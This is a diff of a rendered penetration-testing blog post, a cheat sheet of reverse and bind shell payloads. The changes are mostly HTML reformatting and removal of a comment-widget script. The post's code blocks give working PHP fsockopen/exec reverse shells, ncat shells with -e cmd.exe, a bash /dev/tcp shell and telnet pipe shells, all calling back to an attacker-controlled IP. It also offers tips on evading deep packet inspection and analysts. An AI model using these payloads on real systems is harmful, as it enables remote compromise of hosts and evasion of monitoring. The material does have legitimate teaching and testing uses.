@@ -75,9 +75,8 @@
 
 <p>If you think it should work and it’s not, tcpdump or wireshark your host (if you can) and see what’s coming and going. If I’m trying to exploit a web app on port 80 to send back a remote shell, one tcpdump quickie I use is</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>tcpdump -qtpni eth0/tap0/whatever0 host &lt;VICTIMIP&gt; and not port 80 
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcpdump -qtpni eth0/tap0/whatever0 host &lt;VICTIMIP&gt; and not port 80 
+</code></pre></div></div>
 
 <p>That watches traffic for anything coming back and gives you a condensed, simple output for it only on the interface you expect the attack to copme back through (tap0 if you’re on a VPN, for example), listening only for the victim host so you don’t see a bunch of other noise and excluding the port you know you’re going to see traffic on. In this case, since I’m attacking port 80, I’m probably listening on port 443 with a netcat listener. You could specify port 443 only, but this wouldn’t catch if you did something wrong in your exploit and are sending the exploit back to the wrong port (we all make mistakes).</p>
 
@@ -93,21 +92,19 @@
 
 <p>This is a very generic PHP reverse shell. It runs PHP inside of itself to send a connection back with /bin/sh</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>'&lt;?php  echo shell_exec(php -r '$sock=fsockopen("&lt;IP&gt;",&lt;PORT&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"); ?&gt;'
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'&lt;?php  echo shell_exec(php -r '$sock=fsockopen("&lt;IP&gt;",&lt;PORT&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"); ?&gt;'
+</code></pre></div></div>
 
 <p>Here are a lot of variations on a theme. Each one worked for something different (some didn’t work at all, but might for you), and others are just interesting.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>'&lt;?php -r fsockopen("&lt;ATTACKIP&gt;",443); exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"); ?&gt;'
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'&lt;?php -r fsockopen("&lt;ATTACKIP&gt;",443); exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"); ?&gt;'
 '&lt;?php $s=fsockopen("&lt;ATTACKIP&gt;",443);exec("/bin/sh -i &lt;&amp;4 &gt;&amp;4 2&gt;&amp;4");?&gt;'
 '&lt;?php exec("/bin/sh | /bin/nc &lt;ATTACKIP&gt; 443");?&gt;'
 '&lt;?php $sock=fsockopen("&lt;ATTACKIP&gt;",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");?&gt;'
 '&lt;?php set_time_limit (20);$sock=fsockopen("&lt;ATTACKIP&gt;",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");?&gt;'
 '&lt;?php $sock=fsockopen("&lt;ATTACKIP&gt;",443);exec("/bin/sh -i &gt;&amp; /dev/tcp/&lt;ATTACKIP&gt;/443 0&gt;&amp;1");?&gt;'
 '&lt;?php shell_exec("/bin/sh -i &gt;&amp; /dev/tcp/&lt;ATTACKIP&gt;/443 0&gt;&amp;1");?&gt;'
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>No matter what’s different with each one, every single one is calling a command shell, sending it over a network connection to the port you want. Every example is using port 443, so adjust that as you need to adjust it. Also, note that it’s suspicious to send non-HTTPS traffic over 443, so keep that in mind if you’re dealing with deep packet inspection or an attentive analyst. It might be more useful to use meterpreter reverse_https for something like that.</p>
 
@@ -117,35 +114,30 @@
 
 <p>Of course, you’ll have to work these into your exploit. To create a bind shell that only allows a specific IP to connect to it, use</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>ncat -lvp 4445 -e cmd.exe --allow &lt;ATTACKIP&gt; --ssl
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncat -lvp 4445 -e cmd.exe --allow &lt;ATTACKIP&gt; --ssl
+</code></pre></div></div>
 
 <p>To do this even more safely, use a reverse shell</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>ncat -v &lt;attackIP&gt; 443 -e cmd.exe --ssl
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncat -v &lt;attackIP&gt; 443 -e cmd.exe --ssl
+</code></pre></div></div>
 
 <h3 id="non-netcat-shells">Non-netcat Shells</h3>
 
 <p>This one is really clunky, but it works when you just can’t get anything else working. For this to work, you need two listeners and your shell will show up on the second one. It’s a complete mess, but it works and it’s just kind of nifty to see.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>telnet &lt;ATTACKIP&gt; 443 | /bin/sh | telnet &lt;ATTACKIP&gt; 444
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet &lt;ATTACKIP&gt; 443 | /bin/sh | telnet &lt;ATTACKIP&gt; 444
+</code></pre></div></div>
 
 <p>This one came from <a href="https://twitter.com/webpentest/status/424165659518316544">this</a> tweet and it’s interesting.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>/bin/bash -l &gt; /dev/tcp/&lt;ATTACKIP&gt;/&lt;ATTACKPORT&gt; 0&lt;&amp;1 2&gt;&amp;1
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash -l &gt; /dev/tcp/&lt;ATTACKIP&gt;/&lt;ATTACKPORT&gt; 0&lt;&amp;1 2&gt;&amp;1
+</code></pre></div></div>
 
 <p>Another interesting telnet shell</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet &lt;ATTACKIP&gt; &lt;ATTACKPORT&gt; 0/tmp/p
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet &lt;ATTACKIP&gt; &lt;ATTACKPORT&gt; 0/tmp/p
+</code></pre></div></div>
 
 <h4 id="sources">Sources</h4>
 
@@ -165,34 +157,9 @@
     Written on January 17, 2017
   </div>
 
-    <div id="disqus_thread"></div>
-<script>
-
-/**
-*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
-*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
-/*
-var disqus_config = function () {
-this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
-this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
-};
-*/
-(function() { // DON'T EDIT BELOW THIS LINE
-var d = document, s = d.createElement('script');
-s.src = '//remotephone-github-io.disqus.com/embed.js';
-s.setAttribute('data-timestamp', +new Date());
-(d.head || d.body).appendChild(s);
-})();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-
-    <script id="dsq-count-scr" src="//remotephone-github-io.disqus.com/count.js" async></script>
-
-
 </article>
 
     </div>
-
 
 
 
